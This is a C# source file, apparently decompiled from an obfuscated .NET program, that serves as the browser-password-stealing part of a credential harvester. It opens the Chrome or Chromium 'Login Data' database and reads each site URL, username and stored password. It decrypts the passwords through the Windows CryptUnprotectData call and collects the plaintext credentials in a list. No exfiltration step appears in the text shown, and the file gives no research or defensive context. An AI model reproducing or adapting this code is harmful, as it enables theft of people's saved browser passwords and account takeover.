using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

internal sealed class Class8
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	internal struct Struct2
	{
		public int int_0;

		public int int_1;

		public IntPtr intptr_0;

		public string string_0;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	internal struct Struct3
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	private static IntPtr intptr_0 = (IntPtr)0;

	public static void smethod_0(bool bool_0)
	{
		string text = ((!bool_0) ? (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data") : (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Chromium\\User Data\\Default\\Login Data"));
		if (File.Exists(text))
		{
			smethod_1(text, bool_0);
		}
	}

	public static void smethod_1(string string_0, bool bool_0)
	{
		GClass3 gClass = new GClass3(string_0);
		gClass.method_6("logins");
		for (int i = 0; i <= gClass.method_7() - 1; i++)
		{
			string string_ = gClass.method_9(i, "origin_url");
			string string_2 = gClass.method_9(i, "username_value");
			string string_3 = smethod_2(Encoding.Default.GetBytes(gClass.method_9(i, "password_value")));
			if (bool_0)
			{
				Class19.list_0.Add(new GClass2("Chromium", string_, string_2, string_3, string.Empty));
			}
			else
			{
				Class19.list_0.Add(new GClass2("Chrome", string_, string_2, string_3, string.Empty));
			}
		}
	}

	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Struct3 struct3_0, string string_0, ref Struct3 struct3_1, IntPtr intptr_1, ref Struct2 struct2_0, int int_0, ref Struct3 struct3_2);

	public static string smethod_2(byte[] byte_0)
	{
		Struct3 struct3_ = default(Struct3);
		Struct3 struct3_2 = default(Struct3);
		Struct2 struct2_ = default(Struct2);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		Struct3 struct3_3 = default(Struct3);
		struct3_3.intptr_0 = gCHandle.AddrOfPinnedObject();
		struct3_3.int_0 = byte_0.Length;
		gCHandle.Free();
		CryptUnprotectData(ref struct3_3, string.Empty, ref struct3_2, IntPtr.Zero, ref struct2_, 0, ref struct3_);
		byte[] array = new byte[struct3_.int_0];
		Marshal.Copy(struct3_.intptr_0, array, 0, struct3_.int_0);
		return Encoding.Default.GetString(array);
	}
}
